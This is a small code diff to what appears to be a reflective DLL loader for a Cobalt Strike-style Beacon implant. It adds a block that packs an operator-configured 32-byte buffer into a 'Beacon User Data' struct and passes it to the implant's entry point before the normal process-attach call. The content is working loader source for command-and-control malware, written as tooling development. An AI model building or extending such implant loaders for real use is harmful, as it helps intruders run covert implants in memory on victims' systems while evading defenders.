@@ -547,6 +547,22 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
      * carries the ALLOCATION base, not `flat` itself - VirtualFree with
      * MEM_RELEASE needs the base or it silently fails. */
     dllmain = (BW_DLLMAIN)(sc_base + opt->AddressOfEntryPoint);
+#if defined(BW_UDRL_USER_DATA)
+    /* 4.9 Beacon User Data: when the operator configures a 32-byte custom
+     * buffer (BW_UDRL_USER_DATA), deliver it with reason 0x0d BEFORE the
+     * standard PROCESS_ATTACH - the official contract (beacon copies what
+     * it needs during the call; the struct may be freed afterwards).
+     * Syscall override tables are not delivered yet. */
+    {
+        struct { unsigned int length; unsigned int version; void *syscalls; char custom[32]; } ud;
+        ud.length = (unsigned int)sizeof(ud);
+        ud.version = 1;
+        ud.syscalls = NULL;
+        for (j = 0; j < 32; j++)
+            ud.custom[j] = BW_UDRL_USER_DATA[j];
+        dllmain((void *)sc_base, 0x0d, &ud);
+    }
+#endif
     dllmain((void *)sc_base, DLL_PROCESS_ATTACH, lpParameter);
     {
         struct { DWORD magic; void *alloc; } ho;
